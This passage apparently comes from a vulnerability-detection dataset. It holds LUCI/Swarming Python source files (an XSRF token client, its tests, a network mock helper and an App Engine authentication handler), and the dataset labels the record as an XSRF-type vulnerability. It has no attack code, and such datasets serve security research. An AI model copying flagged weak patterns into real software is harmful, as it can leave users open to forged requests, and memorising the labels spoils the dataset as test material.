options.min_free_space)\n    return 0\n  finally:\n    logging.info('quitting')\n/n/n/n/appengine/swarming/swarming_bot/bot_code/xsrf_client.py/n/n# Copyright 2013 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Wraps URL requests with an XSRF token using components/auth based service.\"\"\"\n\nimport datetime\nimport logging\nimport os\nimport sys\n\nTHIS_DIR = os.path.dirname(os.path.abspath(__file__))\n\nsys.path.insert(0, os.path.join(THIS_DIR, 'third_party'))\n\nfrom utils import net\n\n\nclass Error(Exception):\n  pass\n\n\ndef _utcnow():\n  \"\"\"So it can be mocked.\"\"\"\n  return datetime.datetime.utcnow()\n\n\nclass XsrfRemote(object):\n  \"\"\"Transparently adds XSRF token to requests.\"\"\"\n  TOKEN_RESOURCE = '/auth/api/v1/accounts/self/xsrf_token'\n\n  def __init__(self, url, token_resource=None):\n    self.url = url.rstrip('/')\n    self.token = None\n    self.token_resource = token_resource or self.TOKEN_RESOURCE\n    self.expiration = None\n    self.xsrf_request_params = {}\n\n  def url_read(self, resource, **kwargs):\n    url = self.url + resource\n    if kwargs.get('data') == None:\n      # No XSRF token for GET.\n      return net.url_read(url, **kwargs)\n\n    if self.need_refresh():\n      self.refresh_token()\n    resp = self._url_read_post(url, **kwargs)\n    if resp is None:\n      raise Error('Failed to connect to %s; %s' % (url, self.expiration))\n    return resp\n\n  def url_read_json(self, resource, **kwargs):\n    url = self.url + resource\n    if kwargs.get('data') == None:\n      # No XSRF token required for GET.\n      return net.url_read_json(url, **kwargs)\n\n    if self.need_refresh():\n      self.refresh_token()\n    resp = self._url_read_json_post(url, **kwargs)\n    if resp is None:\n      raise Error('Failed to connect to %s; %s' % (url, self.expiration))\n    return resp\n\n  def refresh_token(self):\n    \"\"\"Returns a fresh token. Necessary as the token may expire after an hour.\n    \"\"\"\n    url = self.url + self.token_resource\n    resp = net.url_read_json(\n        url,\n        headers={'X-XSRF-Token-Request': '1'},\n        data=self.xsrf_request_params)\n    if resp is None:\n      raise Error('Failed to connect to %s' % url)\n    self.token = resp['xsrf_token']\n    if resp.get('expiration_sec'):\n      exp = resp['expiration_sec']\n      exp -= min(round(exp * 0.1), 600)\n      self.expiration = _utcnow() + datetime.timedelta(seconds=exp)\n    return self.token\n\n  def need_refresh(self):\n    \"\"\"Returns True if the XSRF token needs to be refreshed.\"\"\"\n    return (\n        not self.token or (self.expiration and self.expiration <= _utcnow()))\n\n  def _url_read_post(self, url, **kwargs):\n    headers = (kwargs.pop('headers', None) or {}).copy()\n    headers['X-XSRF-Token'] = self.token\n    return net.url_read(url, headers=headers, **kwargs)\n\n  def _url_read_json_post(self, url, **kwargs):\n    headers = (kwargs.pop('headers', None) or {}).copy()\n    headers['X-XSRF-Token'] = self.token\n    return net.url_read_json(url, headers=headers, **kwargs)\n/n/n/n/appengine/swarming/swarming_bot/bot_code/xsrf_client_test.py/n/n#!/usr/bin/env python\n# Copyright 2013 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\nimport datetime\nimport logging\nimport os\nimport sys\nimport time\nimport unittest\n\nimport test_env_bot_code\ntest_env_bot_code.setup_test_env()\n\n# Creates a server mock for functions in net.py.\nimport net_utils\n\nimport xsrf_client\n\n\nclass UrlHelperTest(net_utils.TestCase):\n  def setUp(self):\n    super(UrlHelperTest, self).setUp()\n    self.mock(logging, 'error', lambda *_: None)\n    self.mock(logging, 'exception', lambda *_: None)\n    self.mock(logging, 'info', lambda *_: None)\n    self.mock(logging, 'warning', lambda *_: None)\n    self.mock(time, 'sleep', lambda _: None)\n\n  def testXsrfRemoteGET(self):\n    self.expected_requests([('http://localhost/a', {}, 'foo', None)])\n\n    remote = xsrf_client.XsrfRemote('http://localhost/')\n    self.assertEqual('foo', remote.url_read('/a'))\n\n  def testXsrfRemoteSimple(self):\n    self.expected_requests(\n        [\n          (\n            'http://localhost/auth/api/v1/accounts/self/xsrf_token',\n            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},\n            {\n              'expiration_sec': 100,\n              'xsrf_token': 'token',\n            },\n          ),\n          (\n            'http://localhost/a',\n            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},\n            'foo',\n            None,\n          ),\n        ])\n\n    remote = xsrf_client.XsrfRemote('http://localhost/')\n    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))\n\n  def testXsrfRemoteRefresh(self):\n    self.expected_requests(\n        [\n          (\n            'http://localhost/auth/api/v1/accounts/self/xsrf_token',\n            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},\n            {\n              'expiration_sec': 100,\n              'xsrf_token': 'token',\n            },\n          ),\n          (\n            'http://localhost/a',\n            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},\n            'bar',\n            None,\n          ),\n          (\n            'http://localhost/auth/api/v1/accounts/self/xsrf_token',\n            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},\n            {\n              'expiration_sec': 100,\n              'xsrf_token': 'token2',\n            },\n          ),\n          (\n            'http://localhost/a',\n            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token2'}},\n            'foo',\n            None,\n          ),\n        ])\n\n    now = xsrf_client._utcnow()\n    remote = xsrf_client.XsrfRemote('http://localhost/')\n    remote.url_read('/a', data={'foo': 'bar'})\n    self.mock(\n        xsrf_client, '_utcnow', lambda: now + datetime.timedelta(seconds=91))\n    remote.url_read('/a', data={'foo': 'bar'})\n\n  def testXsrfRemoteCustom(self):\n    # Use the new swarming bot API as an example of custom XSRF request handler.\n    self.expected_requests(\n        [\n          (\n            'http://localhost/swarming/api/v1/bot/handshake',\n            {\n              'data': {'attributes': 'b'},\n              'headers': {'X-XSRF-Token-Request': '1'},\n            },\n            {\n              'expiration_sec': 100,\n              'ignored': True,\n              'xsrf_token': 'token',\n            },\n          ),\n          (\n            'http://localhost/a',\n            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},\n            'foo',\n            None,\n          ),\n        ])\n\n    remote = xsrf_client.XsrfRemote(\n        'http://localhost/',\n        '/swarming/api/v1/bot/handshake')\n    remote.xsrf_request_params = {'attributes': 'b'}\n    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))\n\n\nif __name__ == '__main__':\n  logging.basicConfig(level=logging.ERROR)\n  unittest.main()\n/n/n/n/client/tests/net_utils.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\nimport logging\nimport os\nimport sys\nimport threading\n\nTEST_DIR = os.path.dirname(os.path.abspath(__file__))\nROOT_DIR = os.path.dirname(TEST_DIR)\nsys.path.insert(0, ROOT_DIR)\nsys.path.insert(0, os.path.join(ROOT_DIR, 'third_party'))\n\nfrom depot_tools import auto_stub\nfrom utils import net\n\n\ndef make_fake_response(content, url, headers=None):\n  \"\"\"Returns HttpResponse with predefined content, useful in tests.\"\"\"\n  headers = dict(headers or {})\n  headers['Content-Length'] = len(content)\n  class _Fake(object):\n    def __init__(self):\n      self.content = content\n    def iter_content(self, chunk_size):\n      c = self.content\n      while c:\n        yield c[:chunk_size]\n        c = c[chunk_size:]\n    def read(self):\n      return self.content\n  return net.HttpResponse(_Fake(), url, headers)\n\n\nclass TestCase(auto_stub.TestCase):\n  \"\"\"Mocks out url_open() calls.\"\"\"\n  def setUp(self):\n    super(TestCase, self).setUp()\n    self.mock(net, 'url_open', self._url_open)\n    self.mock(net, 'url_read_json', self._url_read_json)\n    self.mock(net, 'sleep_before_retry', lambda *_: None)\n    self._lock = threading.Lock()\n    self._requests = []\n\n  def tearDown(self):\n    try:\n      if not self.has_failed():\n        self.assertEqual([], self._requests)\n    finally:\n      super(TestCase, self).tearDown()\n\n  def expected_requests(self, requests):\n    \"\"\"Registers the expected requests along their reponses.\n\n    Arguments:\n      request: list of tuple(url, kwargs, response, headers) for normal requests\n          and tuple(url, kwargs, response) for json requests. kwargs can be a\n          callable. In that case, it's called with the actual kwargs. It's\n          useful when the kwargs values are not deterministic.\n    \"\"\"\n    requests = requests[:]\n    for request in requests:\n      self.assertEqual(tuple, request.__class__)\n      # 3 = json request (url_read_json).\n      # 4 = normal request (url_open).\n      self.assertIn(len(request), (3, 4))\n\n    with self._lock:\n      self.assertEqual([], self._requests)\n      self._requests = requests\n\n  def _url_open(self, url, **kwargs):\n    logging.warn('url_open(%s, %s)', url[:500], str(kwargs)[:500])\n    with self._lock:\n      if not self._requests:\n        return None\n      # Ignore 'stream' argument, it's not important for these tests.\n      kwargs.pop('stream', None)\n      for i, n in enumerate(self._requests):\n        if n[0] == url:\n          data = self._requests.pop(i)\n          if len(data) != 4:\n            self.fail('Expected normal request, got json data; %s' % url)\n          _, expected_kwargs, result, headers = data\n          if callable(expected_kwargs):\n            expected_kwargs(kwargs)\n          else:\n            self.assertEqual(expected_kwargs, kwargs)\n          if result is not None:\n            return make_fake_response(result, url, headers)\n          return None\n    self.fail('Unknown request %s' % url)\n\n  def _url_read_json(self, url, **kwargs):\n    logging.warn('url_read_json(%s, %s)', url[:500], str(kwargs)[:500])\n    with self._lock:\n      if not self._requests:\n        return None\n      # Ignore 'stream' argument, it's not important for these tests.\n      kwargs.pop('stream', None)\n      for i, n in enumerate(self._requests):\n        if n[0] == url:\n          data = self._requests.pop(i)\n          if len(data) != 3:\n            self.fail('Expected json request, got normal data; %s' % url)\n          _, expected_kwargs, result = data\n          if callable(expected_kwargs):\n            expected_kwargs(kwargs)\n          else:\n            self.assertEqual(expected_kwargs, kwargs)\n          if result is not None:\n            return result\n          return None\n    self.fail('Unknown request %s' % url)\n/n/n/n", "label": 1, "vtype": "xsrf"}, {"id": "0ba6a589d77baefc5ae20cde5c3a5dc24a6290f9", "code": "appengine/components/components/auth/handler.py/n/n# Copyright 2014 The Swarming Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Integration with webapp2.\"\"\"\n\n# Disable 'Method could be a function.'\n# pylint: disable=R0201\n\nimport functools\nimport json\nimport logging\nimport urllib\nimport webapp2\n\nfrom google.appengine.api import urlfetch\nfrom google.appengine.api import users\n\nfrom components import utils\n\nfrom . import api\nfrom . import config\nfrom . import delegation\nfrom . import host_token\nfrom . import ipaddr\nfrom . import model\nfrom . import openid\nfrom . import tokens\n\n# Part of public API of 'auth' component, exposed by this module.\n__all__ = [\n  'ApiHandler',\n  'AuthenticatingHandler',\n  'gae_cookie_authentication',\n  'get_authenticated_routes',\n  'oauth_authentication',\n  'openid_cookie_authentication',\n  'require_xsrf_token_request',\n  'service_to_service_authentication',\n]\n\n\ndef require_xsrf_token_request(f):\n  \"\"\"Use for handshaking APIs.\"\"\"\n  @functools.wraps(f)\n  def hook(self, *args, **kwargs):\n    if not self.request.headers.get('X-XSRF-Token-Request'):\n      raise api.AuthorizationError('Missing required XSRF request header')\n    return f(self, *args, **kwargs)\n  return hook\n\n\nclass XSRFToken(tokens.TokenKind):\n  \"\"\"XSRF token parameters.\"\"\"\n  expiration_sec = 4 * 3600\n  secret_key = api.SecretKey('xsrf_token', scope='local')\n  version = 1\n\n\nclass AuthenticatingHandlerMetaclass(type):\n  \"\"\"Ensures that 'get', 'post', etc. are marked with @require or @public.\"\"\"\n\n  def __new__(mcs, name, bases, attributes):\n    for method in webapp2.WSGIApplication.allowed_methods:\n      func = attributes.get(method.lower())\n      if func and not api.is_decorated(func):\n        raise TypeError(\n            'Method \\'%s\\' of \\'%s\\' is not protected by @require or @public '\n            'decorator' % (method.lower(), name))\n    return type.__new__(mcs, name, bases, attributes)\n\n\nclass AuthenticatingHandler(webapp2.RequestHandler):\n  \"\"\"Base class for webapp2 request handlers that use Auth system.\n\n  Knows how to extract Identity from request data and how to initialize auth\n  request context, so that get_current_identity() and is_group_member() work.\n\n  All request handling methods (like 'get', 'post', etc) should be marked by\n  either @require or @public decorators.\n  \"\"\"\n\n  # Checks that all 'get', 'post', etc. are marked with @require or @public.\n  __metaclass__ = AuthenticatingHandlerMetaclass\n\n  # List of HTTP methods that trigger XSRF token validation.\n  xsrf_token_enforce_on = ('DELETE', 'POST', 'PUT')\n  # If not None, the header to search for XSRF token.\n  xsrf_token_header = 'X-XSRF-Token'\n  # If not None, the request parameter (GET or POST) to search for XSRF token.\n  xsrf_token_request_param = 'xsrf_token'\n  # Embedded data extracted from XSRF token of current request.\n  xsrf_token_data = None\n  # If not None, sets X_Frame-Options on all replies.\n  frame_options = 'DENY'\n  # A method used to authenticate this request, see get_auth_methods().\n  auth_method = None\n\n  def dispatch(self):\n    \"\"\"Extracts and verifies Identity, sets up request auth context.\"\"\"\n    # Ensure auth component is configured before executing any code.\n    conf = config.ensure_configured()\n    auth_context = api.reinitialize_request_cache()\n\n    # http://www.html5rocks.com/en/tutorials/security/content-security-policy/\n    # https://www.owasp.org/index.php/Content_Security_Policy\n    # TODO(maruel): Remove 'unsafe-inline' once all inline style=\"foo:bar\" in\n    # all HTML tags were removed. Warning if seeing this post 2016, it could\n    # take a while.\n    # - https://www.google.com is due to Google Viz library.\n    # - https://www.google-analytics.com due to Analytics.\n    # - 'unsafe-eval' due to polymer.\n    self.response.headers['Content-Security-Policy'] = (\n        'default-src https: \\'self\\' \\'unsafe-inline\\' https://www.google.com '\n        'https://www.google-analytics.com \\'unsafe-eval\\'')\n    # Enforce HTTPS by adding the HSTS header; 365*24*60*60s.\n    # https://www.owasp.org/index.php/HTTP_Strict_Transport_Security\n    self.response.headers['Strict-Transport-Security'] = (\n        'max-age=31536000; includeSubDomains; preload')\n    # Disable frame support wholesale.\n    # https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet\n    if self.frame_options:\n      self.response.headers['X-Frame-Options'] = self.frame_options\n\n    identity = None\n    for method_func in self.get_auth_methods(conf):\n      try:\n        identity = method_func(self.request)\n        if identity:\n          break\n      except api.AuthenticationError as err:\n        self.authentication_error(err)\n        return\n      except api.AuthorizationError as err:\n        self.authorization_error(err)\n        return\n    else:\n      method_func = None\n    self.auth_method = method_func\n\n    # If no authentication method is applicable, default to anonymous identity.\n    identity = identity or model.Anonymous\n\n    # XSRF token is required only if using Cookie based or IP whitelist auth.\n    # A browser doesn't send Authorization: 'Bearer ...' or any other headers\n    # by itself. So XSRF check is not required if header based authentication\n    # is used.\n    using_headers_auth = method_func in (\n        oauth_authentication, service_to_service_authentication)\n\n    # Extract caller host name from host token header, if present and valid.\n    host_tok = self.request.headers.get(host_token.HTTP_HEADER)\n    if host_tok:\n      validated_host = host_token.validate_host_token(host_tok)\n      if validated_host:\n        auth_context.peer_host = validated_host\n\n    # Verify IP is whitelisted and authenticate requests from bots.\n    assert self.request.remote_addr\n    ip = ipaddr.ip_from_string(self.request.remote_addr)\n    auth_context.peer_ip = ip\n    try:\n      # 'verify_ip_whitelisted' may change identity for bots, store new one.\n      auth_context.peer_identity = api.verify_ip_whitelisted(\n          identity, ip, self.request.headers)\n    except api.AuthorizationError as err:\n      self.authorization_error(err)\n      return\n\n    # Parse delegation token, if given, to deduce end-user identity.\n    delegation_tok = self.request.headers.get(delegation.HTTP_HEADER)\n    if delegation_tok:\n      try:\n        auth_context.current_identity = delegation.check_delegation_token(\n            delegation_tok, auth_context.peer_identity)\n      except delegation.BadTokenError as exc:\n        self.authorization_error(\n            api.AuthorizationError('Bad delegation token: %s' % exc))\n      except delegation.TransientError as exc:\n        msg = 'Transient error while validating delegation token.\\n%s' % exc\n        logging.error(msg)\n        self.abort(500, detail=msg)\n    else:\n      auth_context.current_identity = auth_context.peer_identity\n\n    try:\n      # Fail if XSRF token is required, but not provided.\n      need_xsrf_token = (\n          not using_headers_auth and\n          self.request.method in self.xsrf_token_enforce_on)\n      if need_xsrf_token and self.xsrf_token is None:\n        raise api.AuthorizationError('XSRF token is missing')\n\n      # If XSRF token is present, verify it is valid and extract its payload.\n      # Do it even if XSRF token is not strictly required, since some handlers\n      # use it to store session state (it is similar to a signed cookie).\n      self.xsrf_token_data = {}\n      if self.xsrf_token is not None:\n        # This raises AuthorizationError if token is invalid.\n        try:\n          self.xsrf_token_data = self.verify_xsrf_token()\n        except api.AuthorizationError as exc:\n          if not need_xsrf_token:\n            logging.warning('XSRF token is broken, ignoring - %s', exc)\n          else:\n            raise\n\n      # All other ACL checks will be performed by corresponding handlers\n      # manually or via '@required' decorator. Failed ACL check raises\n      # AuthorizationError.\n      super(AuthenticatingHandler, self).dispatch()\n    except api.AuthorizationError as err:\n      self.authorization_error(err)\n\n  @classmethod\n  def get_auth_methods(cls, conf):\n    \"\"\"Returns an enumerable of functions to use to authenticate request.\n\n    The handler will try to apply auth methods sequentially one by one by until\n    it finds one that works.\n\n    Each auth method is a function that accepts webapp2.Request and can finish\n    with 3 outcomes:\n\n    * Return None: authentication method is not applicable to that request\n      and next method should be tried (for example cookie-based\n      authentication is not applicable when there's no cookies).\n\n    * Returns Identity associated with the request. Means authentication method\n      is applicable and request authenticity is confirmed.\n\n    * Raises AuthenticationError: authentication method is applicable, but\n      request contains bad credentials or invalid token, etc. For example,\n      OAuth2 token is given, but it is revoked.\n\n    A chosen auth method function will be stored in request's auth_method field.\n\n    Args:\n      conf: components.auth GAE config, see config.py.\n    \"\"\"\n    if conf.USE_OPENID:\n      cookie_auth = openid_cookie_authentication\n    else:\n      cookie_auth = gae_cookie_authentication\n    return oauth_authentication, cookie_auth, service_to_service_authentication\n\n  def generate_xsrf_token(self, xsrf_token_data=None):\n    \"\"\"Returns new XSRF token that embeds |xsrf_token_data|.\n\n    The token is bound to current identity and is valid only when used by same\n    identity.\n    \"\"\"\n    return XSRFToken.generate(\n        [api.get_current_identity().to_bytes()], xsrf_token_data)\n\n  @property\n  def xsrf_token(self):\n    \"\"\"Returns XSRF token passed with the request or None if missing.\n\n    Doesn't do any validation. Use verify_xsrf_token() instead.\n    \"\"\"\n    token = None\n    if self.xsrf_token_header:\n      token = self.request.headers.get(self.xsrf_token_header)\n    if not token and self.xsrf_token_request_param:\n      param = self.request.get_all(self.xsrf_token_request_param)\n      token = param[0] if param else None\n    return token\n\n  def verify_xsrf_token(self):\n    \"\"\"Grabs a token from the request, validates it and extracts embedded data.\n\n    Current identity must be the same as one used to generate the token.\n\n    Returns:\n      Whatever was passed as |xsrf_token_data| in 'generate_xsrf_token'\n      method call used to generate the token.\n\n    Raises:\n      AuthorizationError if token is missing, invalid or expired.\n    \"\"\"\n    token = self.xsrf_token\n    if not token:\n      raise api.AuthorizationError('XSRF token is missing')\n    # Check that it was generated for the same identity.\n    try:\n      return XSRFToken.validate(token, [api.get_current_identity().to_bytes()])\n    except tokens.InvalidTokenError as err:\n      raise api.AuthorizationError(str(err))\n\n  def authentication_error(self, error):\n    \"\"\"Called when authentication fails to report the error to requester.\n\n    Authentication error means that some credentials are provided but they are\n    invalid. If no credentials are provided at all, no authentication is\n    attempted and current identity is just set to 'anonymous:anonymous'.\n\n    Default behavior is to abort the request with HTTP 401 error (and human\n    readable HTML body).\n\n    Args:\n      error: instance of AuthenticationError subclass.\n    \"\"\"\n    logging.warning('Authentication error.\\n%s', error)\n    self.abort(401, detail=str(error))\n\n  def authorization_error(self, error):\n    \"\"\"Called when authentication succeeds, but access to a resource is denied.\n\n    Called whenever request handler raises AuthorizationError exception.\n    In particular this exception is raised by method decorated with @require if\n    current identity doesn't have required permission.\n\n    Default behavior is to abort the request with HTTP 403 error (and human\n    readable HTML body).\n\n    Args:\n      error: instance of AuthorizationError subclass.\n    \"\"\"\n    logging.warning(\n        'Authorization error.\\n%s\\nPeer: %s\\nIP: %s',\n        error, api.get_peer_identity().to_bytes(), self.request.remote_addr)\n    self.abort(403, detail=str(error))\n\n  ### Wrappers around Users API or its OpenID equivalent.\n\n  def get_current_user(self):\n    \"\"\"When cookie auth is used returns instance of CurrentUser or None.\"\"\"\n    return self._get_users_api().get_current_user(self.request)\n\n  def is_current_user_gae_admin(self):\n    \"\"\"When cookie auth is used returns True if current caller is GAE admin.\"\"\"\n    return self._get_users_api().is_current_user_gae_admin(self.request)\n\n  def create_login_url(self, dest_url):\n    \"\"\"When cookie auth is used returns URL to redirect user to login.\"\"\"\n    return self._get_users_api().create_login_url(self.request, dest_url)\n\n  def create_logout_url(self, dest_url):\n    \"\"\"When cookie auth is used returns URL to redirect user to logout.\"\"\"\n    return self._get_users_api().create_logout_url(self.request, dest_url)\n\n  def _get_users_api(self):\n    \"\"\"Returns GAEUsersAPI, OpenIDAPI or raises NotImplementedError.\n\n    Chooses based on what auth_method was used of what methods are available.\n    \"\"\"\n    method = self.auth_method\n    if not method:\n      # Anonymous request -> pick first method that supports API.\n      for method in self.get_auth_methods(config.ensure_configured()):\n        if method in _METHOD_TO_USERS_API:\n          break\n      else:\n        raise NotImplementedError('No methods support UsersAPI')\n    elif method not in _METHOD_TO_USERS_API:\n      raise NotImplementedError(\n          '%s doesn\\'t support UsersAPI' % method.__name__)\n    return _METHOD_TO_USERS_API[method]\n\n\nclass ApiHandler(AuthenticatingHandler):\n  \"\"\"Parses JSON request body to a dict, serializes response to JSON.\"\"\"\n  CONTENT_TYPE_BASE = 'application/json'\n  CONTENT_TYPE_FULL = 'application/json; charset=utf-8'\n  _json_body = None\n  # Clickjacking not applicable to APIs.\n  frame_options = None\n\n  def authentication_error(self, error):\n    logging.warning('Authentication error.\\n%s', error)\n    self.abort_with_error(401, text=str(error))\n\n  def authorization_error(self, error):\n    logging.warning(\n        'Authorization error.\\n%s\\nPeer: %s\\nIP: %s',\n        error, api.get_peer_identity().to_bytes(), self.request.remote_addr)\n    self.abort_with_error(403, text=str(error))\n\n  def send_response(self, response, http_code=200, headers=None):\n    \"\"\"Sends successful reply and continues execution.\"\"\"\n    self.response.set_status(http_code)\n    self.response.headers.update(headers or {})\n    self.response.headers['Content-Type'] = self.CONTENT_TYPE_FULL\n    self.response.write(json.dumps(response))\n\n  def abort_with_error(self, http_code, **kwargs):\n    \"\"\"Sends error reply and stops execution.\"\"\"\n    self.abort(\n        http_code,\n        json=kwargs,\n        headers={'Content-Type': self.CONTENT_TYPE_FULL})\n\n  def parse_body(self):\n    \"\"\"Parses JSON body and verifies it's a dict.\n\n    webob.Request doesn't cache the decoded json body, this function does.\n    \"\"\"\n    if self._json_body is None:\n      if (self.CONTENT_TYPE_BASE and\n          self.request.content_type != self.CONTENT_TYPE_BASE):\n        msg = (\n            'Expecting JSON body with content type \\'%s\\'' %\n            self.CONTENT_TYPE_BASE)\n        self.abort_with_error(400, text=msg)\n      try:\n        self._json_body = self.request.json\n        if not isinstance(self._json_body, dict):\n          raise ValueError()\n      except (LookupError, ValueError):\n        self.abort_with_error(400, text='Not a valid json dict body')\n    return self._json_body.copy()\n\n\ndef get_authenticated_routes(app):\n  \"\"\"Given WSGIApplication returns list of routes that use authentication.\n\n  Intended to be used only for testing.\n  \"\"\"\n  # This code is adapted from router's __repr__ method (that enumerate\n  # all routes for pretty-printing).\n  routes = list(app.router.match_routes)\n  routes.extend(\n      v for k, v in app.router.build_routes.iteritems()\n      if v not in app.router.match_routes)\n  return [r for r in routes if issubclass(r.handler, AuthenticatingHandler)]\n\n\n################################################################################\n## All supported implementations of authentication methods for webapp2 handlers.\n\n\ndef gae_cookie_authentication(_request):\n  \"\"\"AppEngine cookie based authentication via users.get_current_user().\"\"\"\n  user = users.get_current_user()\n  try:\n    return model.Identity(model.IDENTITY_USER, user.email()) if user else None\n  except ValueError:\n    raise api.AuthenticationError('Unsupported user email: %s' % user.email())\n\n\ndef openid_cookie_authentication(request):\n  \"\"\"Cookie based authentication that uses OpenID flow for login.\"\"\"\n  user = openid.get_current_user(request)\n  try:\n    return model.Identity(model.IDENTITY_USER, user.email) if user else None\n  except ValueError:\n    raise api.AuthenticationError('Unsupported user email: %s' % user.email)\n\n\ndef oauth_authentication(request):\n  \"\"\"OAuth2 based authentication via oauth.get_current_user().\"\"\"\n  if not request.headers.get('Authorization'):\n    return None\n  if not utils.is_local_dev_server():\n    return api.extract_oauth_caller_identity()\n\n  # OAuth2 library is mocked on dev server to return some nonsense. Use (slow,\n  # but real) OAuth2 API endpoint instead to validate access_token. It is also\n  # what Cloud Endpoints do on a local server. For simplicity ignore client_id\n  # on dev server.\n  header = request.headers['Authorization'].split(' ', 1)\n  if len(header) != 2 or header[0] not in ('OAuth', 'Bearer'):\n    raise api.AuthenticationError('Invalid authorization header')\n\n  # Adapted from endpoints/users_id_tokens.py, _set_bearer_user_vars_local.\n  base_url = 'https://www.googleapis.com/oauth2/v1/tokeninfo'\n  result = urlfetch.fetch(\n      url='%s?%s' % (base_url, urllib.urlencode({'access_token': header[1]})),\n      follow_redirects=False,\n      validate_certificate=True)\n  if result.status_code != 200:\n    try:\n      error = json.loads(result.content)['error_description']\n    except (KeyError, ValueError):\n      error = repr(result.content)\n    raise api.AuthenticationError('Failed to validate the token: %s' % error)\n\n  token_info = json.loads(result.content)\n  if 'email' not in token_info:\n    raise api.AuthenticationError('Token doesn\\'t include an email address')\n  if not token_info.get('verified_email'):\n    raise api.AuthenticationError('Token email isn\\'t verified')\n\n  email = token_info['email']\n  try:\n    return model.Identity(model.IDENTITY_USER, email)\n  except ValueError:\n    raise api.AuthenticationError('Unsupported user email: %s' % email)\n\n\ndef service_to_service_authentication(request):\n  \"\"\"Used for AppEngine <-> AppEngine communication.\n\n  Relies on X-Appengine-Inbound-Appid header set by AppEngine itself. It can't\n  be set by external users (with exception of admins).\n  \"\"\"\n  app_id = request.headers.get('X-Appengine-Inbound-Appid')\n  try:\n    return model.Identity(model.IDENTITY_SERVICE, app_id) if app_id else None\n  except ValueError:\n    raise api.AuthenticationError('Unsupported application ID: %s' % app_id)\n\n\n################################################################################\n## API wrapper on top of Users API and OpenID API to make them similar.\n\n\nclass CurrentUser(object):\n  \"\"\"Mimics subset of GAE users.User object for ease of transition.\n\n  Also adds .picture().\n  \"\"\"\n\n  def __init__(self, user_id, email, picture):\n    self._user_id = user_id\n    self._email = email\n    self._picture = picture\n\n  def nickname(self):\n    return self._email\n\n  def email(self):\n    return self._email\n\n  def user_id(self):\n    return self._user_id\n\n  def picture(self):\n    return self._picture\n\n  def __unicode__(self):\n    return unicode(self.nickname())\n\n  def __str__(self):\n    return str(self.nickname())\n\n\nclass GAEUsersAPI(object):\n  @staticmethod\n  def get_current_user(request):  # pylint: disable=unused-argument\n    user = users.get_current_user()\n    return CurrentUser(user.user_id(), user.email(), None) if user else None\n\n  @staticmethod\n  def is_current_user_gae_admin(request):  # pylint: disable=unused-argument\n    return users.is_current_user_admin()\n\n  @staticmethod\n  def create_login_url(request, dest_url):  # pylint: disable=unused-argument\n    return users.create_login_url(dest_url)\n\n  @staticmethod\n  def create_logout_url(request, dest_url):  # pylint: disable=unused-argument\n    return users.create_logout_url(dest_url)\n\n\nclass OpenIDAPI(object):\n  @staticmethod\n  def get_current_user(request):\n    user = openid.get_current_user(request)\n    return CurrentUser(user.sub, user.email, user.picture) if user else None\n\n  @staticmethod\n  def is_current_user_gae_admin(request):  # pylint: disable=unused-argument\n    return False\n\n  @staticmethod\n  def create_login_url(request, dest_url):\n    return openid.create_login_url(request, dest_url)\n\n  @staticmethod\n  def create_logout_url(request, dest_url):\n    return openid.create_logout_url(request, dest_url)\n\n\n# See AuthenticatingHandler._get_users_api().\n_METHOD_TO_USERS_API = {\n  gae_cookie_authentication: GAEUsersAPI,\n  openid_cookie_authentication: OpenIDAPI,\n}\n/n/n/nappengine/components/components/auth/handler_test.py/n/n#!/usr/bin/env python\n# Copyright 2014 The Swarming Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n# Disable 'Unused variable', 'Unused argument' and 'Method could be a function'.\n# pylint: disable=W0612,W0613,R0201\n\nimport datetime\nimport json\nimport os\nimport sys\nimport unittest\n\nfrom test_support import test_env\ntest_env.setup_test_env()\n\nfrom google.appengine.api import oauth\nfrom google.appengine.api import users\n\nimport webapp2\nimport webtest\n\nfrom components import utils\nfrom components.auth import api\nfrom components.auth import delegation\nfrom components.auth import handler\nfrom components.auth import host_token\nfrom components.auth import ipaddr\nfrom components.auth import model\nfrom components.auth.proto import delegation_pb2\nfrom test_support import test_case\n\n\nclass AuthenticatingHandlerMetaclassTest(test_case.TestCase):\n  \"\"\"Tests for AuthenticatingHandlerMetaclass.\"\"\"\n\n  def test_good(self):\n    # No request handling methods defined at all.\n    class TestHandler1(handler.AuthenticatingHandler):\n      def some_other_method(self):\n        pass\n\n    # @public is used.\n    class TestHandler2(handler.AuthenticatingHandler):\n      @api.public\n      def get(self):\n        pass\n\n    # @require is used.\n    class TestHandler3(handler.AuthenticatingHandler):\n      @api.require(lambda: True)\n      def get(self):\n        pass\n\n  def test_bad(self):\n    # @public or @require is missing.\n    with self.assertRaises(TypeError):\n      class TestHandler1(handler.AuthenticatingHandler):\n        def get(self):\n          pass\n\n\nclass AuthenticatingHandlerTest(test_case.TestCase):\n  \"\"\"Tests for AuthenticatingHandler class.\"\"\"\n\n  def setUp(self):\n    super(AuthenticatingHandlerTest, self).setUp()\n    # Reset global config of auth library before each test.\n    api.reset_local_state()\n    # Capture error and warning log messages.\n    self.logged_errors = []\n    self.mock(handler.logging, 'error',\n        lambda *args, **kwargs: self.logged_errors.append((args, kwargs)))\n    self.logged_warnings = []\n    self.mock(handler.logging, 'warning',\n        lambda *args, **kwargs: self.logged_warnings.append((args, kwargs)))\n\n  def make_test_app(self, path, request_handler):\n    \"\"\"Returns webtest.TestApp with single route.\"\"\"\n    return webtest.TestApp(\n        webapp2.WSGIApplication([(path, request_handler)], debug=True),\n        